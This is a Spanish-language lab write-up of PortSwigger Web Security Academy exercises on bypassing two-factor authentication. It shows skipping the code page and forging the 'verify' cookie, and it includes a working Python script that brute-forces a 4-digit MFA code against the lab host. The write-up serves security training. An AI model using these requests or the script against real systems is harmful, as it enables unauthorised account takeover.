---
description: https://portswigger.net/web-security/authentication/multi-factor
---

# Vulnerabilities in multi-factor authentication

En esta sección, analizaremos algunas de las vulnerabilidades que pueden producirse en los mecanismos de autenticación multifactor.&#x20;

Muchos sitios web dependen exclusivamente de la autenticación de un solo factor mediante una contraseña para autenticar a los usuarios. Sin embargo, algunos requieren que los usuarios demuestren su identidad utilizando varios factores de autenticación.

Verificar factores biométricos no es práctico para la mayoría de los sitios web. Sin embargo, es cada vez más común ver la autenticación obligatoria y opcional de dos factores (2FA) basada **something you know** y **something you have**. Esto normalmente requiere que los usuarios introduzcan una contraseña tradicional y un código de verificación temporal desde un dispositivo físico fuera de banda en su poder.

Si bien a veces es posible que un atacante obtenga un solo factor basado en el conocimiento, como una contraseña, poder obtener simultáneamente otro factor externo es considerablemente menos probable. Por esta razón, la autenticación de dos factores es demostrablemente más segura que la autenticación de un solo factor. Sin embargo, al igual que con cualquier medida de seguridad, solo es tan seguro como su implementación. La autenticación de dos factores mal implementada se puede superar, o incluso omitir por completo, del mismo modo que la autenticación de un solo factor puede.

También vale la pena señalar que todos los beneficios de la autenticación multifactor sólo se logran mediante la verificación de múltiples factores diferentes. Verificar el mismo factor de dos maneras diferentes no es verdadera autenticación de dos factores. 2FA basado en correo electrónico es uno de esos ejemplos. Aunque el usuario tiene que proporcionar una contraseña y un código de verificación, el acceso al código solo se basa en que conozcan las credenciales de inicio de sesión de su cuenta de correo electrónico. Por lo tanto, el factor de autenticación de conocimiento simplemente se está verificando dos veces

## Two-factor authentication tokens

Los códigos de verificación suelen ser leídos por el usuario desde un dispositivo físico de algún tipo. Muchos sitios web de alta seguridad ahora proporcionan a los usuarios un dispositivo dedicado para este propósito, como el token RSA o el dispositivo de teclado que puede usar para acceder a su banca en línea o portátil de trabajo. Además de estar diseñados específicamente para la seguridad, estos dispositivos dedicados también tienen la ventaja de generar el código de verificación directamente. También es común que los sitios web utilicen una aplicación móvil dedicada, como Google Authenticator, por la misma razón.

Por otro lado, algunos sitios web envían códigos de verificación al teléfono móvil de un usuario como mensaje de texto. Si bien esto técnicamente todavía está verificando el factor de "algo que tienes", está abierto al abuso. En primer lugar, el código se transmite a través de SMS en lugar de ser generado por el propio dispositivo. Esto crea la posibilidad de que el código sea interceptado. También existe el riesgo de intercambio de SIM, por el cual un atacante obtiene fraudulentamente una tarjeta SIM con el número de teléfono de la víctima. A continuación, el atacante recibiría todos los mensajes SMS enviados a la víctima, incluido el que contiene su código de verificación.

## Bypassing two-factor authentication

A veces, la implementación de la autenticación de dos factores es defectuosa hasta el punto en que se puede omitir por completo.

Si primero se le pide al usuario que introduzca una contraseña y, a continuación, se le pide que introduzca un código de verificación en una página independiente, el usuario está efectivamente en un estado de "inicio de sesión" antes de haber introducido el código de verificación. En este caso, vale la pena probar para ver si puede omitir directamente a las páginas de "solo inicio de sesión" después de completar el primer paso de autenticación. Ocasionalmente, encontrará que un sitio web no comprueba realmente si completó o no el segundo paso antes de cargar la página.&#x20;

### Lab: 2FA simple bypass

* &#x20;Nuestras credenciales: `wiener:peter`
* &#x20;Credenciales víctimas `carlos:montoya`

Iniciamos sesión con nuestra cuenta. Se nos enviará un mensaje al correo creado en el laboratorio.

![](<../../.gitbook/assets/image (57).png>)

Vemos él inicia de sesión.

![](<../../.gitbook/assets/image (21).png>)

Vemos que al iniciar hemos sido redireccionados a `/my-account`.

![](<../../.gitbook/assets/image (20).png>)

En este ejemplo ya se nos dan las credenciales de la víctima, por lo que si iniciamos sesión y como no tenemos acceso a correo de la víctima, obviamente no podemos obtener el código de 4 dígitos.

![](<../../.gitbook/assets/image (51).png>)

Pero debido a la mala implementación, si visitamos directamente` /my-account`, sin introducir el código, habremos ganado acceso a su cuenta.

![](<../../.gitbook/assets/image (69).png>)

## Flawed two-factor verification logic

A veces, la lógica defectuosa en la autenticación de dos factores significa que después de que un usuario haya completado el paso de inicio de sesión inicial, el sitio web no verifica adecuadamente que el mismo usuario esté completando el segundo paso.

Por ejemplo, el usuario inicia sesión con sus credenciales normales en el primer paso de la siguiente manera:

```
POST /login-steps/first HTTP/1.1
Host: vulnerable-website.com
...
username=carlos&password=qwerty
```

A continuación, se les asigna una cookie que se relaciona con su cuenta, antes de ser llevada al segundo paso del proceso de inicio de sesión:

```
HTTP/1.1 200 OK
Set-Cookie: account=carlos

GET /login-steps/second HTTP/1.1
Cookie: account=carlos
```

Al enviar el código de verificación, la solicitud utiliza esta cookie para determinar a qué cuenta está intentando acceder el usuario:

```
POST /login-steps/second HTTP/1.1
Host: vulnerable-website.com
Cookie: account=carlos
...
verification-code=123456
```

En este caso, un atacante podría iniciar sesión con sus propias credenciales, pero luego cambiar el valor de la cookie de cuenta a cualquier nombre de usuario arbitrario al enviar el código de verificación.

```
POST /login-steps/second HTTP/1.1
Host: vulnerable-website.com
Cookie: account=victim-user
...
verification-code=123456
```

Esto es extremadamente peligroso si el atacante es entonces capaz de forzar bruscamente el código de verificación, ya que les permitiría iniciar sesión en cuentas arbitrarias de los usuarios basadas enteramente en su nombre de usuario. Ni siquiera necesitarían conocer la contraseña del usuario.

### Lab: 2FA broken logic

* Nuestras credenciales: `wiener:peter`
* Credenciales víctimas `carlos`

Primero iniciaremos sesión e interceptaremos las peticiones para saber que es lo que hace. Vemos la petición POST en /login en ella se tramitan los datos para iniciar sesión.

![](<../../.gitbook/assets/imagen (75).png>)

Después de este paso, se nos pedirá el código de seguridad.

![](<../../.gitbook/assets/imagen (23).png>)

El código llega a nuestro correo.

![](<../../.gitbook/assets/imagen (90).png>)

Solo tendríamos que ingresar el código y acceder. La petición POST a /login2 que hicimos, contiene el código.

![](<../../.gitbook/assets/imagen (40).png>)

Sabiendo esto probaremos generar un código para **`carlos`**, ya que al momento de mandar de iniciar sesión podemos modificar el nombre de usuario del cual generaríamos el código. Mandaremos al repeater la petición GET hacia /login2. Solo modificaremos el parámetro `verify`, a Carlos esto se asegurará de que se genere un código 2FA para Carlos.

![](<../../.gitbook/assets/imagen (66).png>)

Una vez generado el código, mandaremos la petición POST /login2 (la cual envía el código de verificación) a intruder. Posteriormente cambiaremos el capo de verify y asignemos el payload a mfa-code.

![](<../../.gitbook/assets/imagen (28).png>)

Cambiaremos la el tipo de payload a Brute forcer y los caracteres del 0-9.

![](<../../.gitbook/assets/imagen (80).png>)

Lo anterior sería el caso para realizarlo con burpsuite de paga porque si lo haces con la versión gratuita te tardaras años. Podemos realizarlo con Python de esta sencilla forma y se tardará mucho menos.

```python
import requests


all_codes = []

for i in range(600,10000):
    all_codes.append('{0:04}'.format(i))

for code in all_codes:
    n = 0
    burp0_url = "https://ac561f771f4f0a6bc0ac2ddc00fe0078.web-security-academy.net:443/login2"
    burp0_cookies = {"verify": "carlos", "session": "021czOk1JddAIo5pXSPvk6WZJ6mM04Se"}
    burp0_headers = {"Cache-Control": "max-age=0", "Sec-Ch-Ua": "\"Chromium\";v=\"95\", \";Not A Brand\";v=\"99\"", "Sec-Ch-Ua-Mobile": "?0", "Sec-Ch-Ua-Platform": "\"Linux\"", "Upgrade-Insecure-Requests": "1", "Origin": "https://ac561f771f4f0a6bc0ac2ddc00fe0078.web-security-academy.net", "Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document", "Referer": "https://ac561f771f4f0a6bc0ac2ddc00fe0078.web-security-academy.net/login2", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9", "Connection": "close"}
    burp0_data = {"mfa-code": "{}".format(code)}
    response = requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)
    print("CODE: {} STATUS CODE: {}".format(code,response.status_code))
    if response.status_code == 302:
        print(code)
        break
```

